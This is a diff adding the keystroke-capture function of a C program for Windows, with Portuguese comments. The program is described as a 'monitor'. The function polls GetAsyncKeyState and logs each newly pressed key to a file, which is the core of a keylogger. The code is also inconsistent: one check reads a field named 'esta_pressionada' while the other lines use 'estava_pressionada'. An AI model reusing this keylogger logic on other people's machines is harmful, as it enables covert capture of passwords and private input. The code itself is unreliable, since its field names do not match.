@@ -82,4 +82,21 @@ void InicializarTeclas() {
     for (int i = 0; i < 12; i++) AdicionarTecla(VK_F1 + i);
 }
 
-void VerificarTeclas(FILE *arquivo)
+// função com a lógica principal do funcionamento do monitor
+void VerificarTeclas(FILE *arquivo) {
+    char nome_tecla[10];
+
+    for(int i = 0; i < total_teclas; i++) {
+        int vk = teclas[i].vk;
+        int esta_pressionada = (GetAsyncKeyState(vk) & 0x8000) ? 1 : 0;
+
+        if (esta_pressionada && !teclas[i].esta_pressionada) {
+            VKParaString(vk, nome_tecla);
+            fprintf(arquivo, "%s\n", nome_tecla);
+            fflush(arquivo);
+            teclas[i].estava_pressionada = 1;
+        }
+        if (!esta_pressionada && teclas[i].estava_pressionada) teclas[i].estava_pressionada = 0;
+    }
+
+}
